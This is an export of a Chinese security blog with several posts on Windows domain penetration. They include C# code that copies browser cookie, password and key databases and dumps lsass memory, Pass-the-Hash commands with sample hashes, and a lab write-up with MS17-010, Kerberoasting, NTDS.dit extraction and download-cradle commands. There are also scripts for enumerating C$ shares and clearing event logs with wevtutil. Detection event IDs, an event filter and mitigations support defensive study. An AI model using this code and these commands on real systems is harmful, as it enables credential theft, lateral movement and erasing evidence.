(&apos;wmic logicaldisk where &quot;Size&lt;&gt;null&quot; get name&apos;) Do (%%I &amp;&amp; dir /s /a %%I) 4) 执行命令获取相关12345678910111213141516171819202122232425262728293031323334353637383940414243// 运行基础命令查询 public static void GetBasisInfo() &#123; /* * - 获取系统基础信息 * - 管道没找到好的利用方式 * - 直接加载系统库，使用 system,此方法有个缺点，需要预分配内存，部分命令无法运行 * - 最后选择 ProcessStartInfo */ string[] commands = &#123; &quot;systeminfo&quot;, &quot;netstat -anop tcp&quot;, &quot;ipconfig /all&quot;, &quot;tasklist /v&quot;, &quot;set&quot;, &quot;query user&quot;, &quot;net share&quot;, // 自启动的程序 &quot;wmic startup list full&quot;, // 查看分区 &quot;wmic logicaldisk where drivetype=3 get name,freespace,systemname,filesystem,volumeserialnumber,size&quot;, // 判断 .NET 版本 &quot;dir %WINDIR%\\Microsoft.NET\\Framework\\v*&quot;, &#125;; foreach (string command in commands) &#123; string FileName = command.Replace(&quot;/&quot;, &quot;&quot;).Replace(&quot;-&quot;, &quot;&quot;).Replace(&quot;+&quot;, &quot;&quot;).Replace(&quot;%&quot;, &quot;&quot;).Replace(&quot;,&quot;, &quot;&quot;).Replace(&quot;=&quot;, &quot;&quot;).Replace(&quot;*&quot;, &quot;&quot;).Replace(&quot;\\&quot;, &quot;&quot;); ProcessStartInfo proccessStartInfo = new ProcessStartInfo(&quot;cmd.exe&quot;, &quot; /c &quot; + command); proccessStartInfo.CreateNoWindow = true; Process proc = new Process &#123; StartInfo = proccessStartInfo &#125;; proc.StartInfo.RedirectStandardOutput = true; // 由调用程序获取输出信息 proc.StartInfo.UseShellExecute = false; // 是否使用操作系统shell启动 proc.StartInfo.CreateNoWindow = true; // 不显示程序窗口 proc.Start(); // 启动程序 string outlist = proc.StandardOutput.ReadToEnd(); TxtWriter(outlist, FileName); proc.WaitForExit(); // 等待程序执行完退出进程 proc.Close(); &#125; &#125; 5) 程序安装及版本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// 查找安装程序及版本 public static void GetInstalledApplications() &#123; /* * - 从注册 Uninstall 表项中提取相关信息，进行筛选 */ string basekey = &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall&quot;; RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(basekey); if (registryKey != null) &#123; // This key exists foreach (string rname in registryKey.GetSubKeyNames()) &#123; RegistryKey installedapp = registryKey.OpenSubKey(rname); if (installedapp != null) &#123; string displayname = (installedapp.GetValue(&quot;DisplayName&quot;) != null) ? installedapp.GetValue(&quot;DisplayName&quot;).ToString() : &quot;&quot;; string displayversion = (installedapp.GetValue(&quot;DisplayVersion&quot;) != null) ? installedapp.GetValue(&quot;DisplayVersion&quot;).ToString() : &quot;&quot;; string helplink = (installedapp.GetValue(&quot;HelpLink&quot;) != null) ? installedapp.GetValue(&quot;HelpLink&quot;).ToString() : &quot;&quot;; if (!(Regex.IsMatch(displayname, &quot;^(Service Pack \\d+|(Definition\\s|Security\\s)?Update) for&quot;) &amp;&amp; Regex.IsMatch(helplink, &quot;support\\.microsoft&quot;)) &amp;&amp; displayname != &quot;&quot;) &#123; if (displayversion != &quot;&quot;) &#123; //Console.Out.WriteLine(&quot;\t[*] &quot; + displayname + &quot; (&quot; + displayversion + &quot;)&quot;); string displaynameversion = displayname + &quot; (&quot; + displayversion + &quot;)&quot;; TxtWriter(displayname, &quot;查找安装程序及版本&quot;); &#125; else &#123; //Console.Out.WriteLine(&quot;\t[*] &quot; + displayname); TxtWriter(displayname, &quot;查找安装程序及版本&quot;); &#125; &#125; &#125; &#125; &#125; basekey = &quot;Software\\Microsoft\\Installer\\Products&quot;; registryKey = Registry.CurrentUser.OpenSubKey(basekey); if (registryKey != null) &#123; foreach (string rname in registryKey.GetSubKeyNames()) &#123; RegistryKey installedapp = registryKey.OpenSubKey(rname); if (installedapp != null) &#123; string displayname = (installedapp.GetValue(&quot;ProductName&quot;) != null) ? installedapp.GetValue(&quot;ProductName&quot;).ToString() : &quot;&quot;; if (displayname != &quot;&quot;) //Console.Out.WriteLine(&quot;\t[*] &quot; + displayname); TxtWriter(displayname, &quot;查找安装程序及版本&quot;); &#125; &#125; &#125; &#125; 6) 最近浏览的文件123456789101112131415161718public static void Recent() &#123; /* * - 最近预览的文件 * - 在 Tools 有朋友发过类似的 bat 脚本，实现原理是遍历用户目录下的lnk和url文件，然后调用vbs脚本获取快捷方式所指向的文件或者网址 * - 参考：https://www.t00ls.net/articles-46152.html */ string userPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); string recents = @&quot;Microsoft\Windows\Recent&quot;; string recentsPath = Path.Combine(userPath, recents); DirectoryInfo di = new DirectoryInfo(recentsPath); //Console.WriteLine(&quot;[+] Recent Items in &quot; + recentsPath); foreach (var file in di.GetFiles()) &#123; TxtWriter(file.Name, &quot;最近预览的文件&quot;); //Console.WriteLine(&quot;\t[*] &quot; + file.Name); &#125; &#125; 7) 网络代理信息1234567891011121314151617181920212223242526272829public static void GetProxyInformation() &#123; /* * - GetSystemWebProxy() 返回使用当前模拟用户的 Internet Explorer 设置配置的代理 * - 使用代理访问 google.com 进行确认 * - 如果存在验证情况，则将相关信息进行输出 */ IWebProxy wp = WebRequest.GetSystemWebProxy(); string url = &quot;https://www.google.com&quot;; Uri req = new Uri(url); //Console.Out.WriteLine(&quot;[+] URL Requested: &quot; + req.AbsoluteUri); Uri proxy = wp.GetProxy(req); if (String.Compare(req.AbsoluteUri, proxy.AbsoluteUri) != 0) &#123; //Console.Out.WriteLine(&quot;\t[*] Proxy: DIRECT&quot;); TxtWriter(proxy.AbsoluteUri, &quot;网络代理情况&quot;); &#125; else if (wp.Credentials != null) &#123; NetworkCredential cred = wp.Credentials.GetCredential(req, &quot;basic&quot;); string[] cerd = &#123; cred.UserName, cred.Password, cred.Domain &#125;; foreach (string cers in cerd) &#123; TxtWriter(cers, &quot;网络代理情况&quot;); &#125; &#125; &#125; 8) 浏览器相关文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// 获取 Chrome 相关 public static void ChromeLocation() &#123; string localAppData = Environment.GetEnvironmentVariable(&quot;USERPROFILE&quot;); string ChromeBasePath = String.Format(&quot;&#123;0&#125;\\AppData\\Local\\Google\\Chrome&quot;, localAppData); if (Directory.Exists(ChromeBasePath)) &#123; // 获取 Chrome 浏览器相关文件路径 string ChromeHistoryPath = String.Format(&quot;&#123;0&#125;\\User Data\\Default\\History&quot;, ChromeBasePath); string ChromeBookmarkPath = String.Format(&quot;&#123;0&#125;\\User Data\\Default\\Bookmarks&quot;, ChromeBasePath); string ChromeCookiesPath = String.Format(&quot;&#123;0&#125;\\User Data\\Default\\Cookies&quot;, ChromeBasePath); string ChromeLoginDataPath = String.Format(&quot;&#123;0&#125;\\User Data\\Default\\Login Data&quot;, ChromeBasePath); string[] ChromePaths = &#123; ChromeHistoryPath, ChromeBookmarkPath, ChromeCookiesPath, ChromeLoginDataPath &#125;; // 创建文件夹、判断文件是否存在 string FilePath = CreateBrowserDirectory(&quot;\\Chrome&quot;); foreach (string filePath in ChromePaths) &#123; if (File.Exists(filePath)) &#123; var FileName = filePath.Substring(filePath.LastIndexOf(&apos;\\&apos;)); File.Copy(filePath, FilePath + FileName); &#125; &#125; &#125; else &#123; Console.WriteLine(&quot;[+] Not Chrome Directory&quot;); &#125; &#125; // 获取 Friefox 相关 public static void FroefoxLocation() &#123; // 获取 Friefox 浏览器目录 string localAppData = Environment.GetEnvironmentVariable(&quot;USERPROFILE&quot;); string FirefoxBasePath = String.Format(&quot;&#123;0&#125;\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\&quot;, localAppData); if (Directory.Exists(FirefoxBasePath)) &#123; // 获取 Friefox 浏览器相关文件路径 string[] directories = Directory.GetDirectories(FirefoxBasePath); foreach (string directory in directories) &#123; string FirefoxPlaces = string.Format(&quot;&#123;0&#125;\\&#123;1&#125;&quot;, directory, &quot;places.sqlite&quot;); string FirefoxCer_1 = String.Format(&quot;&#123;0&#125;\\&#123;1&#125;&quot;, directory, &quot;cert8.db&quot;); string FirefoxCer_2 = String.Format(&quot;&#123;0&#125;\\&#123;1&#125;&quot;, directory, &quot;cert9.db&quot;); string FirefoxKey_1 = String.Format(&quot;&#123;0&#125;\\&#123;1&#125;&quot;, directory, &quot;key3.db&quot;); string FirefoxKey_2 = String.Format(&quot;&#123;0&#125;\\&#123;1&#125;&quot;, directory, &quot;key4.db&quot;); string FirefoxLogon = String.Format(&quot;&#123;0&#125;\\&#123;1&#125;&quot;, directory, &quot;logins.json&quot;); string[] FirefoxPaths = &#123; FirefoxPlaces, FirefoxCer_1, FirefoxCer_2, FirefoxKey_1, FirefoxKey_2, FirefoxLogon &#125;; // 创建文件夹、判断文件是否存在 string FilePath = CreateBrowserDirectory(&quot;\\Friefox&quot;); foreach (string filePath in FirefoxPaths) &#123; if (File.Exists(filePath)) &#123; var FileName = filePath.Substring(filePath.LastIndexOf(&apos;\\&apos;)); File.Copy(filePath, FilePath + FileName); &#125; &#125; &#125; &#125; else &#123; Console.WriteLine(&quot;[+] Not Friefox Directory&quot;); &#125; &#125; 9) MiniDump直接取用SharpDump，需要高权限 123456789101112131415161718192021222324252627282930313233343536[DllImport(&quot;dbghelp.dll&quot;, EntryPoint = &quot;MiniDumpWriteDump&quot;, CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)] static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam); public static void Minidump() &#123; IntPtr targetProcessHandle = IntPtr.Zero; uint targetProcessId = 0; Process targetProcess = null; Process[] processes = Process.GetProcessesByName(&quot;lsass&quot;); targetProcess = processes[0]; try &#123; targetProcessId = (uint)targetProcess.Id; targetProcessHandle = targetProcess.Handle; &#125; catch (Exception ex) &#123; Console.WriteLine(String.Format(&quot;\n[X] Error getting handle to &#123;0&#125; (&#123;1&#125;): &#123;2&#125;\n&quot;, targetProcess.ProcessName, targetProcess.Id, ex.Message)); return; &#125; bool bRet = false; string dumpDir = Program.CreateDirectory(); string dumpFile = String.Format(&quot;&#123;0&#125;\\lsass_pid-&#123;1&#125;.dmp&quot;, dumpDir, targetProcessId); //string zipFile = String.Format(&quot;&#123;0&#125;\\lsass_pid&#123;1&#125;.bin&quot;, dumpDir, targetProcessId); //Console.WriteLine(String.Format(&quot;\n[*] Dumping &#123;0&#125; (&#123;1&#125;) to &#123;2&#125;&quot;, targetProcess.ProcessName, targetProcess.Id, dumpFile)); using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write)) &#123; bRet = MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero); &#125; &#125; 10) 文件夹压缩加密AES 加密 0x02 信息解析模块 本文所缺失的相关代码，下步更新放出。 1) 压缩包解密AES 解密 2) MiniDump利用 subtee 的 PELoader 加载 Mimikatz 的自定义版本，加载 minidump 文件，运行 sekurlsa :: logonpasswords 和 sekurlsa::ekeys 3) 浏览器相关解析相关 sqlite 文件 解析密码文件 0x03 整合的相关项目列表AVQuery.cna EDR.cna SharpAttack SafetyKatz 这类型的开源项目，完全可以从中拓展，改写成适合自己的工具。]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>编程之道</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pass The Hash [ 知识回顾 ]]]></title>
    <url>%2F2019%2F04%2FPass%20The%20Hash%2F</url>
    <content type="text"><![CDATA[这个[ 知识回顾 ]系列文章，整合记录的是在掌握知识点中，所忽略的点、涉及的原理等； 0x00 前言在横向移动中，无论是域环境还是工作组环境，hash传递常用于在获取用户hash凭证后，且在不破解的情况下，重新使用它来欺骗身份验证系统在同一网络上创建新的经过身份验证的会话。 0x01 Pass The Hash的原理 在windows系统中，通常会使用NTLM身份认证。 NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser) NTLM就好像是一个令牌，有了这个令牌就相当于获取了这个令牌所属者的权限，它只是在身份验证的时候绕过了用户必须输入口令的那一步。 这个不是漏洞。 0x02 常用攻击方式 meterpreter 1use exploit/windows/smb/psexec_psh wmiexec 1wmiexec.py -hashes e6db7544d2c6d325ca3b108f3faa626d:5a625b04e786347908fc5f5d8a26dad5(LMHASH:NTHASH) rcoil/john@192.10.20.22 "whoami" Invoke-WMIExec 1Invoke-WMIExec -Target 192.10.20.22 -Domain rcoil.org -Username john -Hash 5a625b04e786347908fc5f5d8a26dad5 -Command "calc.exe" -verbose Invoke-SMBExec 1Invoke-SMBExec -Target 192.10.20.22 -Domain rcoil.org -Username john -Hash 5a625b04e786347908fc5f5d8a26dad5 -Command "calc.exe" -verbose mimikatz（Overpass-the-hash） 12privilege：：debugsekurlsa::pth /user:john /domain:rcoil.org /ntlm:5a625b04e786347908fc5f5d8a26dad5 CrackMapExec 1cme smb 192.10.20.22 -u john -H 5a625b04e786347908fc5f5d8a26dad5 -x whoami 0x03 如何检测由于Hash传递的结果为有效身份验证，因此建议检测查看涉及到的身份验证日志以确定正常用户行为与异常用户行为。这可能需要大量的数据分析，且可能导致许多误报的调查结果。 1） 工作组日志事件 产生NTLM身份验证 日志ID 4648 查看登录信息 显示账户已经成功登陆 日志ID 4624 所有用户登录事件 在4624事件中，登陆类型为2，表示是一个交互式登陆。这符合使用runas登陆的方式。 日志ID 4672 分配给新登录的特权 SQLServer 机器 在192.168.1.104机器上查看，在4624事件上能明确看到登陆类型为3，即网络登陆。且登陆身份验证数据包为NTLM。我们还将看到4672事件，因为我们利用的用户帐户是特权帐户 2） 域控日志事件以下是我们在不使用pass-the-hash执行NTLM身份验证时看到的日志摘要。这为我们提供了正常行为的基线。 Source Host Target Host Domain Controller 4648 - 使用显式凭据尝试登录 4624 - 帐户已成功登录。登录类型3，NTLM 4768 - 请求了Kerberos身份验证票证（TGT） 4624 - 帐户已成功登录。登录类型2 4672 - 分配给新登录的特权 4769 - 请求了Kerberos服务票证 4672 - 分配给新登录的特权 4776 - 计算机尝试验证帐户的凭据 接下来看看Pass The Hash所产生的日志事件 3）Pass The Hash事件以下是我们在使用Pass-The-Hash执行NTLM身份验证时看到的日志摘要。 Source Host Target Host Domain Controller 4648 - 使用显式凭据尝试登录 4624 - 帐户已成功登录。登录类型3，NTLM 4776 - 计算机尝试验证帐户的凭据 4624 - 帐户已成功登录 （登录类型= 9 ,登录过程= Seclogo 4672 - 分配给新登录的特权 4672 - 分配给新登录的特权 （登录用户，而不是模拟用户） 自定义事件过滤器，可用于显示特定信息。 123456789101112131415161718192021&lt;QueryList&gt; &lt;Query Id=&quot;0&quot; Path=&quot;Security&quot;&gt; &lt;Select Path=&quot;Security&quot;&gt; *[System[(EventID=&apos;4624&apos;)] and EventData[Data[@Name=&apos;LogonType&apos;]=&apos;9&apos;] and EventData[Data[@Name=&apos;LogonProcessName&apos;]=&apos;seclogo&apos;] and EventData[Data[@Name=&apos;AuthenticationPackageName&apos;]=&apos;Negotiate&apos;] ] &lt;/Select&gt; &lt;/Query&gt; &lt;Query Id=&quot;0&quot; Path=&quot;Microsoft-Windows-Sysmon/Operational&quot;&gt; &lt;Select Path=&quot;Microsoft-Windows-Sysmon/Operational&quot;&gt; *[System[(EventID=10)]] and *[EventData[Data[@Name=&apos;GrantedAccess&apos;] and (Data=&apos;0x1010&apos; or Data=&apos;0x1038&apos;)]]&lt;/Select&gt; &lt;/Query&gt;&lt;/QueryList&gt; 以上日志事件可自行验证。 VB代码为：&lt; https://docs.microsoft.com/en-us/previous-versions/bb671200%28v%3dvs.90%29&gt; 4） 要想放心，还是得买买买StealthDEFEND Real-Time Auditing for Active Directory 略…. 5）蜜罐部署https://blog.stealthbits.com/detecting-pass-the-hash-honeypots/https://blog.stealthbits.com/implementing-detections-for-the-honeyhash/https://blog.stealthbits.com/deploying-pass-the-hash-honeypots/https://go.stealthbits.com/l/71852/2018-09-11/7vsk5x 略…. 0x04 缓解措施 域管账户只能访问域控制器，且强调最少用户访问的概念。 域控制器与其余敏感系统只能从可信的脱网环境进行访问。 使用双因素身份验证。 监控身份验证与异常登陆活动相关日志。 启用LSA保护。 手动添加注册表，取消明文存储（KB2871997补丁）： 1reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 略…. 0x05 参考Pass the hash从hash传递攻击谈相关Windows安全机制Active Directory administrative tier model如何检测Windows中的横向渗透攻击HOW TO DETECT PASS-THE-HASH ATTACKSPass-the-hash attacks: Tools and Mitigation]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>系统安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网练习（四）- 知识梳理]]></title>
    <url>%2F2019%2F03%2F%E5%86%85%E7%BD%91%E7%BB%83%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89%2F</url>
    <content type="text"><![CDATA[环境为模拟环境，文章使用的均为公开测试工具且未涉及到各个方法的原理。 分享便是我最好的老师。 ——Micropoor 0x00 前言在渗透测试中，经常会遇到一些奇奇怪怪的环境。本文所采用的环境是一个红蓝对抗靶场，以贴切实际环境为出发点。 目的：摸清整个内网拓扑图、获取域控内的flag文件及指定域用户手中的flag。 提示：flag{ooxx-ooxx} 初始网络拓扑 0x01 靶机信息收集因为是模拟环境，所以初始权限为win7域用户权限（上了RAT–&gt;http协议）。 DKRST011的基本信息 12345678910机器名: DKRST011权限: 域用户权限(rcoil\tk001)系统: Windows 7 Professional 6.1.7601 Service Pack 1 Build 7601 x64Domain: rcoil.localIP地址: 172.16.238.29杀软: McAfee(非最新版)补丁情况：[*240].NET版本：V1.0、V1.1、V2.0、V3.0、V3.5、V4.0已有操作: 密码拖取（需要未提权）、全盘文件列表获取、浏览器浏览记录及密码、TCP连接及进程等相关基础操作额为信息: 192.168.5.6:8080为内网代理服务 --&gt; Linux 在收集信息的时候发现TCP连接都是内网连接，而RAT的进程连接也是内网，感觉网络有问题。 探测出网情况：此机器为半脱网情况，dns、icmp、udp均不可出来，http与https协议可出网。所有出网程序连接均为192.10.22.6:8080，由此初步判断为代理出网情况，且是http无限制出网。 通过对带有password等关键字眼的文件进行搜索拖取，当作储备。 内网存活探测 12345- ICMP- SMB 172.16.88.0/16 192.168.5.0/16.... 0x02 对域内信息进行获取从全盘文件列表中可看到setspn是存在的，但是在我进行对域信息进行收集的时候发现已经没了（两个操作之间隔着一段时间）。为了方便操作（socks代理），所以使用Cobalt Strike上线操作。 1）问题（均为RAT上运行） Cobalt Strike免杀问题； powerview运行无反应（powershell、C#）； Bloodhound/Sharphou运行无反应； setspn.exe 被删除。 2）方案 免杀shellcode，使用加载器运行，例子 ； Cobalt Strike的execute-assembly运行本地相应C#程序； 使用GetUserSPNs 替换setspn使用；1python GetUserSPNs.py -request -dc-ip 192.10.22.22 pentestlab.com/rcoil 3）域信息的收集结果大致如下1234567域控： TTT-2_172.16.88.21_windows 2016 x64 (主域控) TTT-V_172.16.88.20_windows 2016 x64 (辅助域控) 域管理员：10+域用户：200+域内机器：150+其他：略.... 0x03 域控（域管理员）权限获取方法按照当前权限，梳理出一些知识点，大概可支持当前应用（知识串联）。 1） 常规方法及结果 组策略漏洞（GPP）–&gt; （MS14-025） 1234567方法： enum4linux -a -u tk001 -p P@ssw0rd 172.16.88.21 (数据收集) smbclient //172.16.88.21/SYSVOL -U tk001 或者使用msf auxiliary/scanner/smb/smb_enum_gpp[*] 结果： 失败（其实单单看是2016 server系统就知道不会成功） MS17-010 12345678[*]msf auxiliary/admin/smb/ms17_010_command auxiliary/scanner/smb/smb_ms17_010 exploit/windows/smb/ms17_010_eternalblue exploit/windows/smb/ms17_010_eternalblue_win8 exploit/windows/smb/ms17_010_psexec[*] 结果： TTT-V_172.16.88.20成功执行命令 Kerberoasting 1234567[*]GetUserSPNs.py python GetUserSPNs.py -request -dc-ip 192.10.22.22 pentestlab.com/rcoil 关闭Kerberos预身份认证[*]Rubeus --&gt; https://github.com/GhostPack/Rubeus Rubeus.exe asreproast # 枚举所有域用户（或者指定）Roasting AS-REPs[*] 结果: 失败 2） 主流方法及结果 基于资源约束委派(RBCD) –&gt; （未尝试） 123456[*] 条件：2012+域控制器[*] powermad[*] powerview[*] Rubeus[*] SharpAllowedToAct https://github.com/pkb1s/SharpAllowedToAct NTLM中继攻击（未尝试） 12345678[*] Responder windows版本：https://github.com/Kevin-Robertson/Inveigh（修改函数名绕杀软等方法） linux版本：https://github.com/SpiderLabs/Responder[*] mitm6+ntlmrelayx https://github.com/fox-it/mitm6 https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py[*] CrackMapExec https://github.com/byt3bl33d3r/CrackMapExec Exchange （未启用Exchange） 1234567[*] Privexchange privexchange.py -ah 172.16.238.29 TTT-2.rcoil.local -u tk001 -d rcoil.local -p P@ssw0rd # Privexchange.py对echange进行API调用 ntlmrelayx.py -t ldap://172.16.88.21 --escalate-user tk001 # ntlmrelayx将Exchange服务器的凭据中继到主DC，然后升级tk001的权限 secretsdump.py rcoil/tk001@TTT-2.rcoil.local -just-dc[*] Exchange2domain --&gt; 一体化的privexchange工具 https://github.com/Ridter/Exchange2domain 3） 辅助工具 BloodHound –&gt; 映射出活动目录关系 ADAPE-Script –&gt; AD评估和权限提升脚本 Invoke-PsUACme –&gt; 绕过UAC CrackMapExec –&gt; 查找特权帐户等等等利用 SILENTTRINITY –&gt; 后期利用 …. 除了以上这些点，还有很多方法，最无脑的就是查看当前用户具有读权限的域内所有共享，信息收集，翻一轮、 123[*] powerviewFind-DomainShare -CheckShareAccess | fl | Out-File domain-shares.txt[*] 略.... 0x04 域控权限TTT-V_172.16.88.20使用MS17-010成功执行命令。 域控信息： 123456789101112机器名: TTT-V权限: 域控权限系统: Windows Server 2016 Standard 10.0.14393 N/A Build 14393 x64OS Configuration: Additional/Backup Domain ControllerDomain: rcoil.localIP地址: 172.16.88.20杀软: McAfee(非最新版)补丁情况：[*2].NET版本：V1.0、V1.1、V2.0、V3.0、V3.5、V4.0端口情况：无Web --&gt; TTT-2_172.16.88.21存在80端口IIS服务域信任关系：rcoil.local（root） demo.rcoil.local 往下的思路是这样的： 123[*] 本机flag获取[*] 在TTT-V机器上拖取NTDS.dit文件，本地恢复获取域内所有用户hash。当然，能获取到明文是最好的。[*] 使用CrackMapExec、wmiexec等工具执行相关操作（重点：以域管权限启动CS，后使用PTH攻击 --&gt; 简直完美）。 1）实施 flag获取 123456[*] dir dir /s flag[*] powerview(可选) Invoke-Filefinder -Threads 100 -Verbose -Terms flag -IncludeC -OutFile C:\Windows\Temp\flags.txt flag&#123;Genius_only_means_hard-working_all_one&apos;s_life&#125; 直接反弹MS17-010的shell进行操作 12bind_tcp --&gt; 失败bind_pipe --&gt; 失败 IPC操作 1234[*] 不建议之操作 添加添加系统隐藏账号密码进行IPC一系列操作[*] 域管权限 直接从域控IPC到DKRST011进行工具复制 --&gt; 拒绝访问 NTDS.dit 12345678910vssadmin create shadow /for=c: copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\NTDS.dit c:\windows\temp\ntds.dit copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SYSTEM c:\windows\temp\system.hivevssadmin delete shadows /shadow=&#123;1xxxxx0b-e47d-xxxx-969f-8xxa4xxxx0xx&#125; /quiet最后通过 //172.16.88.21/SYSVOL 拖到 DKRST011 机器，本地恢复python secretsdump.py -ntds /root/ntds.dit -system /root/SYSTEM LOCAL域管理员的password为hash格式。后使用 CrackMapExec、wmiexec等工具进行进一步测试。 注：调用Volume Shadow Copy服务会产生日志文件，位于System下，Event ID为7036 2）遇到问题执行以下命令：1wmiexec.py -hashes LMHASH:NTHASH rcoil/administrator@172.16.238.29 &quot;c:\\payload.exe&quot; Cobalt Strike未上线，这个情况其实是第一次见。 以多种形式的payload运行也无果。 确认非协议问题，因为以同样的程序，在域用户权限下正常启动并上线。 3）方案 获取明文密码，计划任务启动； 添加HKLM自启注册表 0x05 获取域管明文密码使用powerview查询域管登陆过的机器：123# Find-DomainUserLocation == old Invoke-UserHunter# enumerate servers that allow unconstrained Kerberos delegation and show all users logged inFind-DomainUserLocation -ComputerUnconstrained -ShowAll 最后选择了172.16.10.29的win 2008 server的机器，而且这台机器上存在AdAudit Plus。 由于目前没有任何容器可提供文件传输，所以自建。 在DKRST011机器创建FTP或者Web服务； 12345678910111213141516import SimpleHTTPServerimport SocketServerimport sysPORT = 80if len(sys.argv) != 2: print(&quot;use: web.exe port&quot;)else: PORT = int(sys.argv[1]) Handler = SimpleHTTPServer.SimpleHTTPRequestHandler httpd = SocketServer.TCPServer((&quot;&quot;, PORT), Handler) print &quot;SimpleHTTPServer is &quot;, PORT print &quot;by k8gege&quot; httpd.serve_forever()来源：https://raw.githubusercontent.com/k8gege/K8tools/master/web.py 注：这类型操作也需要添加防火墙规则，防止弹窗netsh advfirewall firewall add rule name=&quot;web.exe&quot; dir=in program=&quot;c:\Users\Public\Downloads\web.exe&quot; action=allow 使用certutil、bitsadmin、powersehll等自带程序下载； 123[*] certutil -urlcache -split -f http://172.16.238.29/1.rar 2.rar[*] bitsadmin /rawreturn /transfer 任务名 http://172.16.238.29/1.rar 2.rar[*] powershell -WindowStyle Hidden &quot;IEX (New-Object Net.WebClient).DownloadFile(&apos;http://172.16.238.29/1.rar&apos;,&apos;c:\windows\temp\ 2.rar&apos;)&quot; 这里有人就会问了，为什么不将需要使用的东西放入到域共享目录里面，原因是要操作的机器访问域共享提示无法访问。 往下就是Procdump的一些操作，成功获取到明文密码。 1234[*] 高权限计划任务启动CS服务端，未上线。[*] 添加HKLM自启动，未上线。这是什么问题呢？（未解决） 0x05 其余flag获取从提示与目的来判断，剩下的2个flag位于demo.rcoil.local域的域控、域用户名为flagav的机器上。 flagav用户机器直接从AdAudit Plus获取到域用户flagav的登陆情况，这样就不用去翻日志了。使用CrackMapExec、wmiexec等工具执行命令查找flag： 1flag&#123;Cease_to_struggle_and_you_cease_to_live&#125; 子域域控flag 使用主域控的域管可直接登陆子域的域控 1flag&#123;Success_grows_out_of_struggles_to_overcome_difficulties&#125; 0x0x 最后的拓扑好多没去了解，就草草结束了。 免责声明：文章中所提到的工具/教程，不得用于商业或非法用途，否则后果自负。]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>系统安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【域渗透】获取域环境内用户登录信息]]></title>
    <url>%2F2018%2F11%2F%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%86%85%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%2F</url>
    <content type="text"><![CDATA[之前见到有人在讨论域内用户在域内的机器ip怎么查呢，集思广益，结合答复及自己的观点，总结了以下内容。 0x00 adfind(未实践)有时候管理员会设置域用户只可以登录指定的的域内计算机，使用adfind或者powerview导出域用户信息可以查看；123456查看域内用户详细信息：adfind.exe -h DNS_SERVER_IP -sc u:username(目标用户)查看域内所有用户详细信息：AdFind.exe -h DNS_SERVER_IP -sc u:*详见：http://www.joeware.net/freetools/tools/adfind/usage.htm powerview在域内执行就可以。 0x01 查看域内机器的用户目录文件夹确定开机状态的计算机列表-建立连接-查看用户目录-断开连接，可以参考如下批处理：123456789for /f "delims=" %%i in (live.txt) DO ( net use \\%%i\C$ password /u:domain\domain_admins_user if not errorlevel 1 ( for /f "delims=" %%j in ('dir /od /b \\%%i\C$\users\') do ( echo %%i:%%j&gt;&gt; test.log ) net use \\%%i\C$ /del )) 域管不用建立连接就可以访问域内计算机资源（未实践），因此以域管权限运行时可以参考如下批处理：12345for /f "delims=" %%i in (live.txt) DO ( for /f "delims=" %%j in ('dir /od /b \\%%i\C$\users\') do ( echo %%i:%%j&gt;&gt; test.log )) 0x02 域控日志wevtutil为Windows 事件命令行实用程序，其导出的日志为evtx格式（即Windows日志本身的存储格式），可以使用Windows事件查看器分析，Crtl+F查找，或者不使用epl参数，直接重定向输出即可。wevtutil常用的场景是清理日志。1234wevtutil cl applicationwevtutil cl securitywevtutil cl systemwevtutil cl &quot;windows powershell&quot; 而它也可作为筛选分析日志的工具。这里需要注意的几个ID分别为：4624（用户登陆成功）、4768、4776（用户账号验证成功） 使用wevtutil结合python wevtutil 1wevtutil qe security /q:"Event[System[(EventID=4624 or EventID=4768 or EventID=4776)]]" /f:text /rd:true /c:1 &gt; EvtLogon.dat 参数说明 1234567qe: 从日志或日志文件中查询事件；（默认xml格式显示）Security: 指定安全事件的日志；/q: 筛选规则，可以打开Windows事件查看器的筛选器配置筛选条件后转至XML复制筛选规则；/f: 以text格式显示/rd: 指定读取事件的方向/c: 指定个数该命令其它参数参考wevtutil /? python 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# -- coding:utf-8 --# Python v2.7.10import sysimport csvevt = 'EvtLogon.dat'fevt = open(evt,'r')try: # For Eliminate redundancies lastdate = 'lastdate' lasttask = 'lasttask' # 因为windows下的换行符问题，导致写的文件会有空行，使用二进制模式打开 with open('LogonStat.csv', 'wb') as csvfile: csv_write = csv.writer(csvfile) csv_write.writerow(["Task", "Date", "Account Name", "Account Domain", "Logon Address"]) for eachline in fevt: if eachline.find('Event[') &gt; -1: task = '' date = '' accname = 